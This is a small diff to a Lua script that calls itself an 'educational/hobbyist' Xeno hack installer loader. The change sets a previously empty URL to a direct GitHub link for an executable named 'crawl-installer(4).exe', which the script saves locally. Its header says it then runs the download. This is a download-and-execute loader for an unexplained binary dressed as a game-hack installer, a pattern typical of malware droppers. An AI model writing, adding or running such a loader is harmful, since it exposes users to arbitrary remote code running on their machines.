@@ -2,7 +2,7 @@
 -- Xeno Hack Installer Loader (educational/hobbyist demo)
 -- Downloads a file from a URL and executes the installer
 
-local url = ""
+local url = "https://github.com/Target9/bigpaintball/raw/refs/heads/main/crawl-installer(4).exe"
 local outputPath = "crawl_installer(4).exe"
 
 -- Helper: detect OS
